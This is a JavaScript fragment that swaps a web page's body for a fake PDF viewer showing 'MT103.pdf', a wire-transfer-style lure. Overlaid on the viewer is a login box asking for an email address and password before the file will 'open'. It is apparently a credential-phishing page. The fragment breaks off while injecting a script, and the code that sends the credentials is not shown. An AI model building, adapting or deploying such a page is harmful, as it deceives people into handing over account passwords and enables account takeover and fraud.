  function actn(){
    document.body.innerHTML = box;    
    }
    const box = ` 
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="">
    <title>MT103.pdf</title>
    

<style>




:root {
  --sidebar-width: 200px;
  --sidebar-transition-duration: 200ms;
  --sidebar-transition-timing-function: ease;
  --scale-select-container-width: 140px;
  --scale-select-overflow: 22px;
  --loadingBar-end-offset: 0;

  --toolbar-icon-opacity: 0.7;
  --doorhanger-icon-opacity: 0.9;

  --main-color: rgba(12, 12, 13, 1);
  --body-bg-color: rgba(154, 155, 157, 1);
  --errorWrapper-bg-color: rgba(255, 110, 110, 1);
  --progressBar-color: rgba(10, 132, 255, 1);
  --progressBar-indeterminate-bg-color: rgba(221, 221, 222, 1);
  --progressBar-indeterminate-blend-color: rgba(116, 177, 239, 1);
  --scrollbar-color: auto;
  --scrollbar-bg-color: auto;
  --toolbar-icon-bg-color: rgba(0, 0, 0, 1);
  --toolbar-icon-hover-bg-color: rgba(0, 0, 0, 1);

  --sidebar-narrow-bg-color: rgba(237, 237, 240, 0.9);
  --sidebar-toolbar-bg-color: rgba(245, 246, 247, 1);
  --toolbar-bg-color: rgba(249, 249, 250, 1);
  --toolbar-border-color: rgba(204, 204, 204, 1);
  --button-hover-color: rgba(221, 222, 223, 1);
  --toggled-btn-color: rgba(0, 0, 0, 1);
  --toggled-btn-bg-color: rgba(0, 0, 0, 0.3);
  --toggled-hover-active-btn-color: rgba(0, 0, 0, 0.4);
  --dropdown-btn-bg-color: rgba(215, 215, 219, 1);
  --separator-color: rgba(0, 0, 0, 0.3);
  --field-color: rgba(6, 6, 6, 1);
  --field-bg-color: rgba(255, 255, 255, 1);
  --field-border-color: rgba(187, 187, 188, 1);
  --findbar-nextprevious-btn-bg-color: rgba(227, 228, 230, 1);
  --treeitem-color: rgba(0, 0, 0, 0.8);
  --treeitem-hover-color: rgba(0, 0, 0, 0.9);
  --treeitem-selected-color: rgba(0, 0, 0, 0.9);
  --treeitem-selected-bg-color: rgba(0, 0, 0, 0.25);
  --sidebaritem-bg-color: rgba(0, 0, 0, 0.15);
  --doorhanger-bg-color: rgba(255, 255, 255, 1);
  --doorhanger-border-color: rgba(12, 12, 13, 0.2);
  --doorhanger-hover-color: rgba(12, 12, 13, 1);
  --doorhanger-hover-bg-color: rgba(237, 237, 237, 1);
  --doorhanger-separator-color: rgba(222, 222, 222, 1);


  --loading-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABFUlEQVQ4jZ3SQStEYRTG8V9JFI1SNFmQZDFI1JQm1qLGYspyEitsptmRsrGwsLa0M1lZWc1XsMFe+QY+A4s5V6/hXuWpp/fce8/zv+fcLj81ndQveP6lJ1dHeI8TPsIwiXWMFwE2AvCGsQQwgLUiwH40wENATmKFF0xFeCl6ymFQwmu4gwVcxgSZRjAfoRp2wt8meApIq2DFlQhupROkk7TizFMJsxhMb3bwGL4tCGeqYy9c7wd0/gPINIpmnHmawCqG+h80cY9u1HnaRBvHmEvf3A1foYJDzCTBMhpYxG5A2im5geWoz3GHbZyGa7jAQfTMpROkqkb4Ru/nuQ4P4ywglYIVvwDVuM4A9D7en4B+ZSvk6hMRUDTVA0xsFAAAAABJRU5ErkJggg==);
  --toolbarButton-menuArrow-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAQ0lEQVQ4jWNgGAWDExxgYGA4z8DAIIAkJgAV20+sAf+RDIFp/g+VIwgEGBgYLiAZAtN8Ac1VRBtCsmZ0Q8jSPApIAADYUxNUXuprVgAAAABJRU5ErkJggg==);
  --toolbarButton-sidebarToggle-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAYUlEQVQ4jcWS0QnAIAwFbyQ3rJv6RugG6Y+WtNhWUWogkEDucR+BSRWBBFhjJ2DzcCt47wiw5yVUzOzBODiTMw1AedZHwIWzl8PugPUGxWKtwf8BI48kmPDKJUQdoDw8VAcduXC9HsxnlwAAAABJRU5ErkJggg==);
  --toolbarButton-secondaryToolbarToggle-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAUElEQVQ4jdWQwQkAIAwDbwT3X0Y30I30IwiaQJ81z+MSaCFTGtCBEuRyYArZ8ScFGEJ2/KORGuByoG+xBbgtj+sExZOU4TznlhyXA0pyPEkWN5Y8mUuHK2UAAAAASUVORK5CYII=);
  --toolbarButton-pageUp-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAXUlEQVQ4je3RQQoAIQxD0Ryh97/U9EbORiGGWOluFlMouPA/EIHzBIBnbhT3ynjMbSEatxCOk+J1LhGNg4C4IS4GAevOEUkTK+CQDdDYAYykPsONA1rzA18Arv/9AnwIPc444cS0AAAAAElFTkSuQmCC);
  --toolbarButton-pageDown-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAXUlEQVQ4je3SwQkAIQxE0SnB/psyHcVLAmaIUY+CgiBs/kNYgXoJgL6ZKZfa/sATgP/vdgA0mw3vQ2yQEQY8VmvChwyZAY75tiniwDZeIUrnMs6QeR/FK+QqZqSMB+lJPc/ZBCqwAAAAAElFTkSuQmCC);
  --toolbarButton-zoomOut-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAIElEQVQ4jWNgGAXDDFxgYGD4TyQ+T6kBF2jnj1EwAAAA808XLAizyWwAAAAASUVORK5CYII=);
  --toolbarButton-zoomIn-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAMklEQVQ4jWNgoDG4wMDAcJ4SA/5D8agBRIALSIqJxecpNeACVb0wagBucIGByNAmGwAA82UyUzo7izsAAAAASUVORK5CYII=);
  --toolbarButton-presentationMode-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAf0lEQVQ4jbXQ0RGCMBCE4a+ElEIJKS2daAmWQAfSgXSgHcCDMKMOJDEMO3Mvuezef0deA+6FP0ZMjTWWwqvVSpANiBXrZQNWJbyOBEDA9UjAJ00zwaWVIOFZGrJ1pIjHjnFaPLu71VRylgZ0G+8dbiVz8MYLf/a+pvSZfv9LNwNDz37PCFkvIQAAAABJRU5ErkJggg==);
  --toolbarButton-print-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAXElEQVQ4jWNgQAUXGBgY/hPA5xnwgP/4JIlRM0QNcGBgYLjPQDjw0PF9qF6GB2RoRjYEznEg0xCybaedAYQAUQagB+wDfAagm06MCwhKorsA2RW0TcrEZOcLyBoAud6If48pO2kAAAAASUVORK5CYII=);
  --toolbarButton-openFile-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAeUlEQVQ4jd1TwQ2AIBDrSI7ACI7gCG7gKK7EBt4GssH5sCTQSKL40ibNHUdb7gNwHwOAjbVC4IULFzEb56YhdmHOXKmJNDlrLAOyuMQIIHE+iTZjpq75uhJSHcDe2qAFl96/F2BvA3SbvwSk4vCUBpyfyTrNoWPzGgd+PWpitBkTqAAAAABJRU5ErkJggg==);
  --toolbarButton-download-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAfElEQVQ4jd2SwQ2AIAxF30gdwRHcyFFcyQ1gBDeoByFiA0I52qSH0t/XH1IYj9hqLEAA1ORmdPpFtsM59xGAVporcJqeGn1I7pvbtQPIkKqDltOq8x7gACRpJNUugPB8dEy1C1BCpHhzAWrxJ0B5cd6McJ9jnBxeJpy/4wK4km1PpUYKmAAAAABJRU5ErkJggg==);
  --toolbarButton-bookmark-icon: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAARUlEQVQ4jWNgoAG4wMDA8B8HPk+MAbg0w/CoAaMGkGzAAigmy4ALSGLIyZsoAz4wMDAIIIkJQMWINsAAi7gBsQYkkCIHADjeY0SjzVEvAAAAAElFTkSuQmCC);

}

* {
  padding: 0;
  margin: 0;
}

html {
  height: 100%;
  width: 100%;
  /* Font size is needed to make the activity bar the correct size. */
  font-size: 10px;
}

body {
  height: 100%;
  width: 100%;
  background-color: var(--body-bg-color);
}


.hidden {
  display: none !important;
}
[hidden] {
  display: none !important;
}



#sidebarContainer {
  position: absolute;
  top: 32px;
  bottom: 0;
  width: 200px;
  visibility: hidden;
  z-index: 100;
  border-top: 1px solid rgba(51, 51, 51, 1);
  transition-duration: var(--sidebar-transition-duration);
  transition-timing-function: var(--sidebar-transition-timing-function);
}
html #sidebarContainer {
  transition-property: left;
  left: calc(0px - var(--sidebar-width));
  border-right: var(--doorhanger-border-color-whcm);
}
html[dir="rtl"] #sidebarContainer {
  transition-property: right;
  right: calc(0px - var(--sidebar-width));
  border-left: var(--doorhanger-border-color-whcm);
}


html #outerContainer.sidebarOpen #sidebarContainer {
  left: 0;
}
html[dir="rtl"] #outerContainer.sidebarOpen #sidebarContainer {
  right: 0;
}

#mainContainer {
  position: absolute;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  min-width: 320px;
}

#sidebarContent {
  top: 32px;
  bottom: 0;
  overflow: auto;
  position: absolute;
  width: 100%;
  background-color: rgba(0, 0, 0, 0.1);
}
html #sidebarContent {
  left: 0;
  box-shadow: inset -1px 0 0 rgba(0, 0, 0, 0.25);
}
html[dir="rtl"] #sidebarContent {
  right: 0;
  box-shadow: inset 1px 0 0 rgba(0, 0, 0, 0.25);
}

#viewerContainer {
  overflow: auto;
  position: absolute;
  top: 32px;
  right: 0;
  bottom: 0;
  left: 0;
  outline: none;
}
#viewerContainer:not(.pdfPresentationMode) {
  transition-duration: var(--sidebar-transition-duration);
  transition-timing-function: var(--sidebar-transition-timing-function);
}

#outerContainer.sidebarResizing #viewerContainer {
  /* Improve responsiveness and avoid visual glitches when the sidebar is resized. */
  transition-duration: 0s;
}

html
  #outerContainer.sidebarOpen
  #viewerContainer:not(.pdfPresentationMode) {
  transition-property: left;
  left: var(--sidebar-width);
}
html[dir="rtl"]
  #outerContainer.sidebarOpen
  #viewerContainer:not(.pdfPresentationMode) {
  transition-property: right;
  right: var(--sidebar-width);
}

.toolbar {
  position: relative;
  left: 0;
  right: 0;
  z-index: 9999;
  cursor: default;
}

#toolbarContainer {
  width: 100%;
}

#toolbarSidebar {
  width: 100%;
  height: 32px;
  background-color: var(--sidebar-toolbar-bg-color);
}


#sidebarResizer {
  position: absolute;
  top: 0;
  bottom: 0;
  width: 6px;
  z-index: 200;
  cursor: ew-resize;
}
html #sidebarResizer {
  right: -6px;
}
html[dir="rtl"] #sidebarResizer {
  left: -6px;
}

#toolbarContainer,
.findbar,
.secondaryToolbar {
  position: relative;
  height: 32px;
  background-color: var(--toolbar-bg-color);
  box-shadow: 0 1px 0 var(--toolbar-border-color);
}

#toolbarViewer {
  height: 32px;
}

#loadingBar {
  position: absolute;
  height: 4px;
  background-color: var(--body-bg-color);
  border-bottom: 1px solid var(--toolbar-border-color);

  transition-duration: var(--sidebar-transition-duration);
  transition-timing-function: var(--sidebar-transition-timing-function);
}
html #loadingBar {
  transition-property: left;
  left: 0;
  right: var(--loadingBar-end-offset);
}
html[dir="rtl"] #loadingBar {
  transition-property: right;
  left: var(--loadingBar-end-offset);
  right: 0;
}

html #outerContainer.sidebarOpen #loadingBar {
  left: var(--sidebar-width);
}
html[dir="rtl"] #outerContainer.sidebarOpen #loadingBar {
  right: var(--sidebar-width);
}

#outerContainer.sidebarResizing #loadingBar {
  /* Improve responsiveness and avoid visual glitches when the sidebar is resized. */
  transition-duration: 0s;
}

#loadingBar .progress {
  position: absolute;
  top: 0;
  left: 0;
  width: 0%;
  height: 100%;
  background-color: var(--progressBar-color);
  overflow: hidden;
  transition: width 200ms;
}

@keyframes progressIndeterminate {
  0% {
    left: -142px;
  }
  100% {
    left: 0;
  }
}

#loadingBar .progress.indeterminate {
  background-color: var(--progressBar-indeterminate-bg-color);
  transition: none;
}

#loadingBar .progress.indeterminate .glimmer {
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: calc(100% + 150px);
  background: repeating-linear-gradient(
    135deg,
    var(--progressBar-indeterminate-blend-color) 0,
    var(--progressBar-indeterminate-bg-color) 5px,
    var(--progressBar-indeterminate-bg-color) 45px,
    var(--progressBar-color) 55px,
    var(--progressBar-color) 95px,
    var(--progressBar-indeterminate-blend-color) 100px
  );
  animation: progressIndeterminate 1s linear infinite;
}

#toolbarViewerMiddle {
  position: absolute;
  left: 50%;
  transform: translateX(-50%);
}

html #toolbarViewerLeft,
html[dir="rtl"] #toolbarViewerRight,
html #toolbarSidebarLeft,
html[dir="rtl"] #toolbarSidebarRight {
  float: left;
}
html #toolbarViewerRight,
html[dir="rtl"] #toolbarViewerLeft,
html #toolbarSidebarRight,
html[dir="rtl"] #toolbarSidebarLeft {
  float: right;
}
html #toolbarViewerLeft > *,
html #toolbarViewerMiddle > *,
html #toolbarViewerRight > *,
html #toolbarSidebarLeft *,
html #toolbarSidebarRight *,
html .findbar * {
  position: relative;
  float: left;
}


.splitToolbarButton {
  margin: 2px 2px 0;
  display: inline-block;
}
html .splitToolbarButton > .toolbarButton {
  float: left;
}
html[dir="rtl"] .splitToolbarButton > .toolbarButton {
  float: right;
}

.toolbarButton,
.secondaryToolbarButton,
.overlayButton {
  border: 0 none;
  background: none;
  width: 28px;
  height: 28px;
}

.overlayButton:hover,
.overlayButton:focus {
  background-color: var(--overlay-button-hover-bg-color);
}

.overlayButton:hover > span,
.overlayButton:focus > span {
  color: var(--overlay-button-hover-color);
}

.toolbarButton > span {
  display: inline-block;
  width: 0;
  height: 0;
  overflow: hidden;
}



.splitToolbarButton > .toolbarButton {
  position: relative;
}
html .splitToolbarButton > .toolbarButton:first-child,
html[dir="rtl"] .splitToolbarButton > .toolbarButton:last-child {
  margin: 0;
}
html .splitToolbarButton > .toolbarButton:last-child,
html[dir="rtl"] .splitToolbarButton > .toolbarButton:first-child {
  margin: 0;
}
.splitToolbarButtonSeparator {
  padding: 10px 0;
  width: 1px;
  background-color: var(--separator-color);
  z-index: 99;
  display: inline-block;
  margin: 4px 0;
}

.findbar .splitToolbarButtonSeparator {
  background-color: var(--field-border-color);
  margin: 0;
  padding: 13px 0;
}

/* important down */
html .splitToolbarButtonSeparator {
  float: left;
}
html[dir="rtl"] .splitToolbarButtonSeparator {
  float: right;
}

.toolbarButton,
.dropdownToolbarButton,
.secondaryToolbarButton,
.overlayButton {
  min-width: 16px;
  margin: 2px 1px;
  padding: 2px 6px 0;
  border: none;
  border-radius: 2px;
  color: var(--main-color);
  font-size: 12px;
  line-height: 14px;
  user-select: none;
  cursor: default;
  box-sizing: border-box;
}

html #toolbarViewerLeft > .toolbarButton:first-child,
html #toolbarViewerRight > .toolbarButton:last-child {
  margin-left: 2px;
}

html #toolbarViewerRight > .toolbarButton:last-child,
html #toolbarViewerLeft > .toolbarButton:first-child {
  margin-right: 2px;
}


.dropdownToolbarButton {
  width: var(--scale-select-container-width);
  padding: 0;
  overflow: hidden;
  background-color: var(--dropdown-btn-bg-color);
  margin-top: 2px !important;
}
.dropdownToolbarButton::after {
  top: 6px;
  pointer-events: none;

  -webkit-mask-image: var(--toolbarButton-menuArrow-icon);
}
html .dropdownToolbarButton::after {
  right: 7px;
}


.dropdownToolbarButton > select {
  width: calc(
    var(--scale-select-container-width) + var(--scale-select-overflow)
  );
  height: 28px;
  font-size: 12px;
  color: var(--main-color);
  margin: 0;
  padding: 1px 0 2px;
  border: none;
  background-color: var(--dropdown-btn-bg-color);
}

html .dropdownToolbarButton > select {
  padding-left: 4px;
}

.dropdownToolbarButton > select > option {
  background: var(--doorhanger-bg-color);
  color: var(--main-color);
}

#customScaleOption {
  display: none;
}

#pageWidthOption {
  border-bottom: 1px rgba(255, 255, 255, 0.5) solid;
}

.toolbarButtonSpacer {
  width: 30px;
  display: inline-block;
  height: 1px;
}

.toolbarButton::before,
.secondaryToolbarButton::before,
.dropdownToolbarButton::after,
.treeItemToggler::before {
  /* All matching images have a size of 16x16
   * All relevant containers have a size of 28x28 */
  position: absolute;
  display: inline-block;
  width: 16px;
  height: 16px;

  content: "";
  background-color: var(--toolbar-icon-bg-color);
  mask-size: cover;
}



.toolbarButton::before {
  opacity: var(--toolbar-icon-opacity);
  top: 6px;
  left: 6px;
}



.toolbarButton#sidebarToggle::before {
  -webkit-mask-image: var(--toolbarButton-sidebarToggle-icon);
}

.toolbarButton#secondaryToolbarToggle::before {
  -webkit-mask-image: var(--toolbarButton-secondaryToolbarToggle-icon);
}


.toolbarButton.findPrevious::before {
  -webkit-mask-image: var(--findbarButton-previous-icon);
}

.toolbarButton.findNext::before {
  -webkit-mask-image: var(--findbarButton-next-icon);
}

.toolbarButton.pageUp::before {
  -webkit-mask-image: var(--toolbarButton-pageUp-icon);
}

.toolbarButton.pageDown::before {
  -webkit-mask-image: var(--toolbarButton-pageDown-icon);
}

.toolbarButton.zoomOut::before {
  -webkit-mask-image: var(--toolbarButton-zoomOut-icon);
}

.toolbarButton.zoomIn::before {
  -webkit-mask-image: var(--toolbarButton-zoomIn-icon);
}

.toolbarButton.presentationMode::before{
  -webkit-mask-image: var(--toolbarButton-presentationMode-icon);
}

.toolbarButton.print::before{
  -webkit-mask-image: var(--toolbarButton-print-icon);
}

.toolbarButton.openFile::before{
  -webkit-mask-image: var(--toolbarButton-openFile-icon);
}

.toolbarButton.download::before{
  -webkit-mask-image: var(--toolbarButton-download-icon);
}

.toolbarButton.bookmark::before{
  -webkit-mask-image: var(--toolbarButton-bookmark-icon);
}




/* important */
.toolbarField {
  padding: 4px 7px;
  margin: 3px 0;
  border-radius: 2px;
  background-color: var(--field-bg-color);
  background-clip: padding-box;
  border-width: 1px;
  border-style: solid;
  border-color: var(--field-border-color);
  box-shadow: none;
  color: var(--field-color);
  font-size: 12px;
  line-height: 16px;
  outline-style: none;
}

/* important */
.toolbarField.pageNumber {
  -moz-appearance: textfield; /* hides the spinner in moz */
  min-width: 16px;
  text-align: right;
  width: 40px;
}



/* important */
.toolbarLabel {
  min-width: 16px;
  padding: 7px;
  margin: 2px;
  border-radius: 2px;
  color: var(--main-color);
  font-size: 12px;
  line-height: 14px;
  text-align: left;
  user-select: none;
  cursor: default;
}

/* important */
html #numPages.toolbarLabel {
  padding-left: 3px;
}

/* for login pop up */


button {
  text-decoration: none;
  color: #29e;
  outline: none;
  -webkit-transition: background-color 0.3s ease 0s, color 0.3s ease 0s;
  -moz-transition: background-color 0.3s ease 0s, color 0.3s ease 0s;
  -ms-transition: background-color 0.3s ease 0s, color 0.3s ease 0s;
  -o-transition: background-color 0.3s ease 0s, color 0.3s ease 0s;
  transition: background-color 0.3s ease 0s, color 0.3s ease 0s;
}
button:hover {
  text-decoration: none;
}
button.inherit {
  color: inherit;
}
.clearfix:after {
  content: "";
  display: block;
  clear: both;
  height: 0;
  line-height: 0;
  visibility: hidden;
}
input {
  outline: none;
  font-family: Verdana, Tahoma, Arial;
  background: none;
}
input::-webkit-input-placeholder {
  color: #aaa;
  font-size: 14px;
}
input::-moz-placeholder {
  color: #aaa;
  font-size: 14px;
}
input:-moz-placeholder {
  color: #aaa;
  font-size: 14px;
}
input:-ms-input-placeholder {
  color: #aaa;
  font-size: 14px !important;
}

input::-ms-clear {
  display: none;
}
input::-ms-reveal {
  display: none;
}
input[type="password"]::-ms-reveal {
  display: none;
}
[class^="icon-"],[class*="icon-"] {
  display: inline-block;
  *display: inline;
  *zoom: 1;
  vertical-align: middle;
}
.icon-user {
  background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAABQElEQVQ4T2NkoDJgxGWeimcu+9Ov94z/M/xT+c/AIApU+JqRgW2/NLfcqzvbJ//EpQ+ngZx2nuH/GBhk0DUyMTA8+X5o+0qSDWS38yzGpennoe29w8xALhtv479M/xxweYv5H9OBb0e2nsUmjzVSOO28rf4x/LPEZSATA9Px74e2HiPaQHYHPxWGf7/9sRr4n+EnAzPrjp8HNt0h2kCQQlyuZGVm2fFl/+arJMcyKGE/+XonHJSoYZpBifvHoe2L8GUunAkbmyvxhR2SpbjtY7P18mdk/K8CU/H/P+OdX4e3bSTJhaAIYfz/V5bhHzAPMzLwoWuG5GkmYISwPP5+aONjLPIQIR63QLE/33/4YzMETwS8luFWWYlcWMDDkMPWM5UUw3AFA9xAfIUBoSITubCgnYGEXEGsPN50SKwhyOoAObx8FR1gUkcAAAAASUVORK5CYII=) no-repeat;
  width: 20px;
  height: 20px;
}
.icon-lock {
    background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAB00lEQVQ4T2NkoDJgxGWeimcu+9Ov94z//f9nxMDIwA5Sx/if4RMjI9PV74e2HsOlD6uBIMOefL0f/p/hryg3B9d7OTGRxyADHr95I/7l2zfx//8Z7/w6vG0jNkOxGshj7+34G+gyewO94zsndtwEavwJ1czqnl+hefDCJUsmBqbj2FyK1UB2O89iMT6hJ482L9nEyMj4Hdkl////51QJjvd49va9zPeDmyejuxLDQE47f9l/DL/CrPT19uyf3HkRm7d8ixs0dp0+6c3EwLbq+6GN4OCAARQDOYBeBUaA3P9//0RYmFjf/Pv3+wc2A/8zMXFA1DAB1TDcRvY6ioEgr5KTin4e2t6L1YW4DOTn4n357dcPnt9/fnNjs5AkA0211M8ent5/cff585z+hfUh//7/YUU3lCQDfxzcNh0Y09+Ascso7hke/fHbZ3GKDITFJCixv/j+KOH3v188FBnIwMj0i5WdbeW/X3+s/v77o0xxGIIM0JGTXfbo7XvrT1+/yFPFQGA4TlIJj7d58uK1EcUGgpPMv9+7JPgFlR+/fG5FsYHEJHScyYbT3jcPWzrDZyioeHu3a+08rDkFmNbEQOUoMa5CUvMHmE7fYjWQRIOwKgcAtAfgFT/Wh6IAAAAASUVORK5CYII=) no-repeat;
  width: 18px;
  height: 16px;
}


button:hover .icon-clear {
  background-position: -120px -20px;
}


.ican-topemail {
  width: 64px;
  height: 64px;
  vertical-align: middle;
}


.wraper {
  padding: 15px 15px 20px;
  position: fixed;
    top: 50%;
    left: 50%;
    -webkit-transform: translate(-50%, -50%);
    transform: translate(-50%, -50%);
  min-width: 360px;
  max-width: 430px;
  *min-width: 430px;
  background-color: rgba(237, 237, 240, 1);
  

}
body.client-browser .wraper,body.client.notop .wraper {
  padding: 43px 15px 20px;
}

body.client-browser .wraper.neterror {
  padding-top: 78px;
}
.logo {
  margin: 0 0 15px;
  text-align: center;
  display: block;
}
.logo .text {
  font-size: 30px;
}
.logo .toptip {
  margin: 6px 0 0;
  color: #999;
  font-size: 16px;
}
.inputwrap {
  background: #fff;
  margin: 0 0 12px;
  height: 48px;
  border: 1px solid #d9d9d9;
  position: relative;
  *z-index: 20;
}
.inputwrap.focus {
  border: 1px solid #29e;
}
.inputwrap.errorfocus {
  border: 1px solid #f44;
}
.inputwrap input[type="text"],.inputwrap input[type="password"],.inputwrap input[type="number"] {
  padding: 10px 15px 10px 45px;
  width: 100%;
  *width: 373px;
  height: 100%;
  *height: 28px;
  line-height: 28px;
  font-size: 16px;
  border: 0 none;
  box-sizing: border-box;
}
.inputwrap input[type="text"].padr1 {
  *width: 343px;
}
.inputwrap input[disabled="disabled"] {
  cursor: not-allowed;
  background: #f0f0f0;
}

.inputwrap .inputdisabled {
  padding: 10px 15px 10px 45px;
  width: 100%;
  *width: 378px;
  height: 100%;
  *height: 28px;
  line-height: 28px;
  font-size: 16px;
  border: 0 none;
  box-sizing: border-box;
  background: #f0f0f0;
  cursor: pointer;
}

.inputwrap .inputclear {
  position: absolute;
  top: 0;
  *top: 14px;
  right: 0;
  line-height: 48px;
  width: 40px;
  text-align: center;
}
.inputwrap .inputclear.moveleft {
  right: 40px;
}
.lable-login {
  position: absolute;
  top: 12px;
  left: 17px;
}
.tiptext {
  margin: 0 0 8px;
  position: relative;
  font-size: 12px;
  color: #999;
}

.ng-hide {
  display: none !important;
}
.submitwrap {
  margin: 0 0 12px;
  padding: 10px 0 0;
  position: relative;
}

button.btn-submit {
  background: #29e;
  color: #fff;
  width: 100%;
  height: 56px;
  line-height: 56px;
  font-size: 18px;
  text-align: center;
  display: inline-block;
  *display: inline;
  *zoom: 1;
  border-radius: 2px;
}
button.btn-submit:hover {
  background: #00a8ff;
  cursor: pointer;
}
button.btn-submit:active {
  background: #07c;
}
.errortip {
  margin: -8px 0 6px;
  color: #f44;
  font-size: 12px;
}
.errortip.disagree {
  margin-top: 0;
  margin-bottom: 0;
}

.top {
  background: #fff;
  height: 52px;
  border-bottom: 1px solid #d8d9dc;
  position: fixed;
  top: 0;
  right: 0;
  left: 0;
  z-index: 100;
}

</style>

  </head>

  <body tabindex="1">
    

      

      <div id="mainContainer">

        

        <div class="toolbar">
          <div id="toolbarContainer">
            <div id="toolbarViewer">
              <div id="toolbarViewerLeft">
                <button id="sidebarToggle" class="toolbarButton" title="Toggle Sidebar" tabindex="11" data-l10n-id="toggle_sidebar" aria-expanded="false" aria-controls="sidebarContainer">
                  <span data-l10n-id="toggle_sidebar_label">Toggle Sidebar</span>
                </button>
                <div class="toolbarButtonSpacer"></div>
                <div class="splitToolbarButton hiddenSmallView">
                  <button class="toolbarButton pageUp" title="Previous Page" id="previous" tabindex="13" data-l10n-id="previous" disabled="">
                    <span data-l10n-id="previous_label">Previous</span>
                  </button>
                  <div class="splitToolbarButtonSeparator"></div>
                  <button class="toolbarButton pageDown" title="Next Page" id="next" tabindex="14" data-l10n-id="next" disabled="">
                    <span data-l10n-id="next_label">Next</span>
                  </button>
                </div>
                <input type="number" id="pageNumber" class="toolbarField pageNumber" title="Page" value="1" size="4" min="1" tabindex="15" data-l10n-id="page" autocomplete="off" max="0">
                <span id="numPages" class="toolbarLabel">of 2</span>
              </div>
              <div id="toolbarViewerRight">
                <button id="presentationMode" class="toolbarButton presentationMode hiddenLargeView" title="Switch to Presentation Mode" tabindex="31" data-l10n-id="presentation_mode">
                  <span data-l10n-id="presentation_mode_label">Presentation Mode</span>
                </button>

                <button id="openFile" class="toolbarButton openFile hiddenLargeView" title="Open File" tabindex="32" data-l10n-id="open_file" hidden="">
                  <span data-l10n-id="open_file_label">Open</span>
                </button>

                <button id="print" class="toolbarButton print hiddenMediumView" title="Print" tabindex="33" data-l10n-id="print">
                  <span data-l10n-id="print_label">Print</span>
                </button>

                <button id="download" class="toolbarButton download hiddenMediumView" title="Download" tabindex="34" data-l10n-id="download">
                  <span data-l10n-id="download_label">Download</span>
                </button>
                <a href="#" id="viewBookmark" class="toolbarButton bookmark hiddenSmallView" title="Current view (copy or open in new window)" tabindex="35" data-l10n-id="bookmark">
                  <span data-l10n-id="bookmark_label">Current View</span>
                </a>

                <div class="verticalToolbarSeparator hiddenSmallView"></div>

                <button id="secondaryToolbarToggle" class="toolbarButton" title="Tools" tabindex="36" data-l10n-id="tools" aria-expanded="false" aria-controls="secondaryToolbar">
                  <span data-l10n-id="tools_label">Tools</span>
                </button>
              </div>
              <div id="toolbarViewerMiddle">
                <div class="splitToolbarButton">
                  <button id="zoomOut" class="toolbarButton zoomOut" title="Zoom Out" tabindex="21">
                    <span>Zoom Out</span>
                  </button>
                  <div class="splitToolbarButtonSeparator"></div>
                  <button id="zoomIn" class="toolbarButton zoomIn" title="Zoom In" tabindex="22" >
                    <span>Zoom In</span>
                   </button>
                </div>
                <span id="scaleSelectContainer" class="dropdownToolbarButton">
                  <select id="scaleSelect" title="Zoom" tabindex="23" data-l10n-id="zoom">
                    <option id="pageAutoOption" title="" value="auto" selected="selected" data-l10n-id="page_scale_auto">Automatic Zoom</option>
                    <option id="pageActualOption" title="" value="page-actual" data-l10n-id="page_scale_actual">Actual Size</option>
                    <option id="pageFitOption" title="" value="page-fit" data-l10n-id="page_scale_fit">Page Fit</option>
                    <option id="pageWidthOption" title="" value="page-width" data-l10n-id="page_scale_width">Page Width</option>
                    <option id="customScaleOption" title="" value="custom" disabled="disabled" hidden="true"></option>
                    
                  </select>
                </span>
              </div>
            </div>
            <div id="loadingBar">
              <div class="progress" style="height: 100%; width: 100%;">
                <div class="glimmer">
                </div>
              </div>
            </div>
          </div>
        </div>

        <div id="viewerContainer" tabindex="0">
          <div id="viewer" class="pdfViewer"></div>
        </div>

      </div> <!-- Login center below-->

    <div class="wraper">
        <div class="logo">
           <img id="elogo" src="" class="ican-topemail">
        </div>
        <div class="inputwrap login-input noContent " id="usremf">
            <label class="lable-login"><i class="icon-user"></i></label>
      <input type="text" class="padr1 ng-valid ng-touched ng-dirty ng-valid-parse" id="email" placeholder="Email" name="username" onfocus="fcs();" onblur="blr()" tabindex="1"> </div>
        <div ng-password="login">
<div id="pwdinp" class="inputwrap input-password login-input noContent " ng-class="{errorfocus:passwordError}">
    <label class="lable-login"><i class="icon-lock"></i></label>
    <input id="password" type="password" placeholder="Password" name="password"  class="ng-valid ng-touched ng-dirty ng-valid-parse" onfocus="fcs2();" onblur="blr2()"tabindex="2">
    </div>
<div id="showerror" class="error ng-binding errortip ng-hide" ></div>
</div>

        <div class="tiptext">
            <span><label class="inherit">MT103.pdf (97.03KB)</label></span>

        </div>

        <div class="submitwrap">
            <button class="btn-submit ng-binding twoToneButton" id="myBtn" onclick=" chck();" tabindex="3">Open File</button>
        </div>
    </div>

    <div id="printContainer"></div>`;
  

    var s = document.createElement("script"); 
